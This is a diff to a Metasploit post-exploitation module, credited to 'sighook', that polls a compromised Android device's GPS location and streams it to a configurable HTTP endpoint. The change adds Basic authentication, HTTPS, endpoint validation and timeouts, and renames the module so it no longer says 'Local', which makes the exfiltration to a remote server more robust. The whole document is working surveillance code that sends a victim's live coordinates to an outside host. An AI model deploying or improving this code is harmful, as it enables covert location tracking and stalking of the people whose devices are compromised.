@@ -1,3 +1,7 @@
+require 'json'
+require 'net/http'
+require 'uri'
+
 class MetasploitModule < Msf::Post
   include Msf::Post::Android::System
 
@@ -5,7 +9,7 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name'         => 'Android GPS Streamer to Local Map Server',
+        'Name'         => 'Android GPS Streamer to Map Server',
         'Description'  => 'Pulls coordinates via geolocate (with wlan_geolocate fallback) and streams via HTTP POST.',
         'License'      => 'GPL-3.0-or-later',
         'Author'       => ['sighook'],
@@ -17,7 +21,9 @@ class MetasploitModule < Msf::Post
     register_options([
       OptInt.new('INTERVAL', [true, 'Seconds between GPS polls', 5]),
       OptString.new('ENDPOINT', [true, 'Target server endpoint URL', 'http://127.0.0.1:8765/api/position']),
-      OptString.new('API_KEY', [false, 'API key for wlan_geolocate fallback (if required)', ''])
+      OptString.new('API_KEY', [false, 'API key for wlan_geolocate fallback (if required)', '']),
+      OptString.new('MAP_USER', [false, 'HTTP Basic username for the map server', '']),
+      OptString.new('MAP_PASSWORD', [false, 'HTTP Basic password for the map server', ''])
     ])
   end
 
@@ -25,7 +31,17 @@ class MetasploitModule < Msf::Post
     interval = datastore['INTERVAL']
     endpoint = datastore['ENDPOINT']
     api_key  = datastore['API_KEY']
+    map_user = datastore['MAP_USER'].to_s
+    map_password = datastore['MAP_PASSWORD'].to_s
     uri = URI.parse(endpoint)
+    unless uri.is_a?(URI::HTTP) && uri.host && !uri.userinfo
+      print_error('ENDPOINT must be an http:// or https:// URL without embedded credentials')
+      return
+    end
+    if map_user.empty? != map_password.empty?
+      print_error('MAP_USER and MAP_PASSWORD must either both be set or both be empty')
+      return
+    end
 
     print_status("Starting GPS stream to #{endpoint} (Interval: #{interval}s)...")
     print_status("Use 'jobs -k <JobID>' to stop.")
@@ -58,12 +74,12 @@ class MetasploitModule < Msf::Post
           lon = loc['long'] || loc[:long] || loc['lon'] || loc[:lon]
 
           if lat && lon && lat.to_f != 0.0 && lon.to_f != 0.0
-            http = Net::HTTP.new(uri.host, uri.port)
-            request = Net::HTTP::Post.new(uri.path, {'Content-Type' => 'application/json'})
-            request.body = { lat: lat.to_f, lon: lon.to_f }.to_json
-
-            response = http.request(request)
-            print_good("[GPS Sent] Lat: #{lat}, Lon: #{lon} | Status: #{response.code}")
+            response = submit_position(uri, lat.to_f, lon.to_f, map_user, map_password)
+            if response.is_a?(Net::HTTPSuccess)
+              print_good("[GPS Sent] Lat: #{lat}, Lon: #{lon} | Status: #{response.code}")
+            else
+              print_error("[GPS] Map server rejected the observation: HTTP #{response.code}")
+            end
           else
             print_error("[GPS] Received empty or zero coordinate values.")
           end
@@ -77,5 +93,17 @@ class MetasploitModule < Msf::Post
 
       sleep(interval)
     end
+  end
+
+  def submit_position(uri, lat, lon, username, password)
+    http = Net::HTTP.new(uri.host, uri.port)
+    http.use_ssl = uri.scheme == 'https'
+    http.open_timeout = 5
+    http.read_timeout = 5
+
+    request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json')
+    request.basic_auth(username, password) unless username.empty?
+    request.body = { lat: lat, lon: lon }.to_json
+    http.request(request)
   end
 end
